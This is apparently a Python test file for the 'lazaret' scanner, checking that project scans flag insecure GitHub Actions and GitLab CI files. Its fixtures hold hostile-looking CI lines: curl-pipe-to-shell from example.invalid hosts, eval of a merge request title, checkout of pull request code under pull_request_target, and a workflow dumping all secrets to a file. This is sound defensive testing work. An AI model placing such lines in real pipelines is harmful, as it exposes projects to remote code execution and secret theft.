"""S-4: the CI files' hardening checks in project scans.

S-2's GitHub workflow checks (ghworkflow.hardening: six SC-WORKFLOW-* ids)
and S-3's GitLab CI checks (gitlabci.hardening: five SC-GITLAB-* ids) were
modules nothing called. A project scan now reports them for each workflow
(.github/workflows/*.yml) and each GitLab CI file (.gitlab-ci.yml, a
*.gitlab-ci.yml, a .yml under .gitlab/), beside the worms' shapes
(SC-WORKFLOW-SECRETS, -BACKDOOR). They are practices, not signs of
tampering: they are reported as security hotspots, and only a CRITICAL one
(a pull_request_target job that runs the pull request's code, a file
included over plain http) fails the gate's supply-chain condition
(core.HARDENING_RULES). The checks themselves are tested in
test_ghworkflow_hardening.py and test_gitlabci.py. Inert content: hosts are
.invalid, nothing runs.
"""
import os
import shutil
import tempfile
import unittest

from lazaret.scanner import _native, core

WORKFLOW = ("name: ci\non: [push, pull_request_target]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n"
            "      - uses: actions/checkout@v4\n      - uses: some/action@v1\n      - uses: actions/checkout@v4\n"
            "        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n"
            "      - run: curl -fsSL https://example.invalid/i.sh | sh\n      - run: npm ci\n")
PINNED = ("name: pinned\non: [push]\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-latest\n"
          "    steps:\n      - uses: actions/checkout@0123456789abcdef0123456789abcdef01234567\n      - run: npm test\n")
GITLAB = ("include:\n  - remote: https://example.invalid/ci.yml\nimage: python:3.12\ntest:\n  script:\n"
          "    - curl https://example.invalid/x | sh\n    - eval \"$CI_MERGE_REQUEST_TITLE\"\n")
EXTRA = "build:\n  image: registry.example.invalid/builder:latest\n  script:\n    - make\n"
TREE = {".github/workflows/ci.yml": WORKFLOW, ".github/workflows/pinned.yml": PINNED, ".gitlab-ci.yml": GITLAB,
        ".gitlab/ci/extra.yml": EXTRA, "app.py": "x = 1\n"}
WANT = [("SC-GITLAB-IMAGE", "MAJOR", ".gitlab/ci/extra.yml", 2), ("SC-GITLAB-IMAGE", "MINOR", ".gitlab-ci.yml", 3),
        ("SC-GITLAB-INCLUDE", "MAJOR", ".gitlab-ci.yml", 2), ("SC-GITLAB-MR-TEXT", "MAJOR", ".gitlab-ci.yml", 7),
        ("SC-GITLAB-PIPE-SHELL", "MAJOR", ".gitlab-ci.yml", 6),
        ("SC-WORKFLOW-PERMISSIONS", "MINOR", ".github/workflows/ci.yml", 3),
        ("SC-WORKFLOW-PIPE-SHELL", "MAJOR", ".github/workflows/ci.yml", 12),
        ("SC-WORKFLOW-PR-CHECKOUT", "CRITICAL", ".github/workflows/ci.yml", 11),
        ("SC-WORKFLOW-UNPINNED", "MAJOR", ".github/workflows/ci.yml", 8),
        ("SC-WORKFLOW-UNPINNED", "MINOR", ".github/workflows/ci.yml", 7),
        ("SC-WORKFLOW-UNPINNED", "MINOR", ".github/workflows/ci.yml", 9)]


def write_tree(root, tree):
    for rel, text in tree.items():
        path = os.path.join(root, *rel.split("/"))
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8", newline="\n") as f:
            f.write(text)


def scan(tree, **kw):
    root = tempfile.mkdtemp(prefix="lz-ci-")
    try:
        write_tree(root, tree)
        return core.scan_project(root, **kw)
    finally:
        shutil.rmtree(root)


def found(res):
    return sorted((i["rule"], i["sev"], i["file"].replace(os.sep, "/"), i["line"]) for i in res["issues"])


def condition(res, label):
    return next(c["ok"] for c in res["conditions"] if c["label"] == label)


@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
class HardeningInProjectScanTests(unittest.TestCase):
    def test_each_ci_file_is_checked(self):
        res = scan(TREE)
        self.assertEqual(found(res), WANT)
        self.assertEqual({i["type"] for i in res["issues"]}, {"HOTSPOT"})
        self.assertEqual(res["counts"]["HOTSPOT"], len(WANT))

    def test_only_a_critical_one_fails_the_supply_chain_condition(self):
        res = scan(TREE)
        self.assertEqual(res["supplyChain"], 1)                       # (the pull request's code checked out)
        self.assertFalse(condition(res, "No supply-chain indicators"))
        quiet = dict(TREE, **{".github/workflows/ci.yml": WORKFLOW.replace("pull_request_target", "pull_request")})
        res = scan(quiet)
        self.assertNotIn("SC-WORKFLOW-PR-CHECKOUT", {i["rule"] for i in res["issues"]})
        self.assertEqual(res["supplyChain"], 0)
        self.assertTrue(condition(res, "No supply-chain indicators"))
        self.assertTrue(res["pass"])
        res = scan({".gitlab-ci.yml": "include:\n  - remote: http://example.invalid/ci.yml\n", "a.py": "x = 1\n"})
        self.assertEqual(found(res), [("SC-GITLAB-INCLUDE", "CRITICAL", ".gitlab-ci.yml", 2)])
        self.assertEqual(res["supplyChain"], 1)

    def test_the_worms_shapes_still_count(self):
        planted = ("name: f\non: push\njobs:\n  lint:\n    runs-on: ubuntu-latest\n    permissions:\n"
                   "      contents: read\n    env:\n      DATA: ${{ toJSON(secrets) }}\n    steps:\n"
                   "      - run: echo \"$DATA\" > f.json\n")
        res = scan({".github/workflows/f.yml": planted, "a.py": "x = 1\n"})
        self.assertIn(("SC-WORKFLOW-SECRETS", "MAJOR", ".github/workflows/f.yml", 9), found(res))
        self.assertEqual(res["supplyChain"], 1)

    def test_files_that_are_not_ci_files(self):
        res = scan({"docs/ci.yml": WORKFLOW, ".github/ci.yml": WORKFLOW, "gitlab-ci.yml.txt": GITLAB, "a.py": "x = 1\n"})
        self.assertEqual(found(res), [])

    def test_a_dependency_trees_ci_files_are_not_read(self):
        dep = {"node_modules/p/package.json": '{"name": "p", "version": "1.0.0"}',
               "node_modules/p/.github/workflows/ci.yml": WORKFLOW, "node_modules/p/.gitlab-ci.yml": GITLAB}
        res = scan(dict(dep, **{"a.py": "x = 1\n"}), include_deps=True)
        self.assertEqual([f for f in found(res) if "node_modules" in f[2]], [])

    def test_the_mcp_server_reports_them_too(self):
        from lazaret.mcp import server
        root = tempfile.mkdtemp(prefix="lz-ci-")
        self.addCleanup(shutil.rmtree, root, True)
        write_tree(root, TREE)
        path = os.path.join(root, ".gitlab-ci.yml")
        out = server.tool_scan_files({"paths": [path]})
        self.assertEqual(sorted((i["rule"], i["line"]) for i in out["files"][path]["issues"]),
                         [("SC-GITLAB-IMAGE", 3), ("SC-GITLAB-INCLUDE", 2), ("SC-GITLAB-MR-TEXT", 7),
                          ("SC-GITLAB-PIPE-SHELL", 6)])

    def test_the_set_is_the_modules_rules(self):
        """Every id a hardening_rule() can give, and no other."""
        import inspect
        import re
        from lazaret.scanner import ghworkflow, gitlabci
        ids = set()
        for module in (ghworkflow, gitlabci):
            ids |= set(re.findall(r'"id": "(SC-[A-Z-]+)"', inspect.getsource(module.hardening_rule)))
        self.assertEqual(ids, core.HARDENING_RULES)

if __name__ == "__main__":
    unittest.main()
